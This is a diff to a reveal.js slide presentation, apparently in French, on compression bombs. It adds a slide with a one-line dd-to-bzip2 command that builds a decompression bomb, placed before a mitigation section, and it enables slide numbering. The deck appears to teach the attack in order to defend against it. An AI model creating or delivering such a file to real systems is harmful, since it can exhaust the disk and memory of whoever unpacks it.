@@ -32,6 +32,13 @@
 					Comment en faire une
 				</section>
 				<section>
+					<pre>
+						<code data-trim data-noescape>
+							dd if=/dev/zero bs=10G count=10000 | bzip2 -c > bomb.bz2
+						</code>
+					</pre>
+				</section>
+				<section>
 					Mitigation
 				</section>
 				<section>
@@ -54,6 +61,8 @@
 					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
 				]
 			});
+			Reveal.configure({ slideNumber: true });
+			Reveal.configure({ slideNumber: 'c/t' });
 		</script>
 	</body>
 </html>
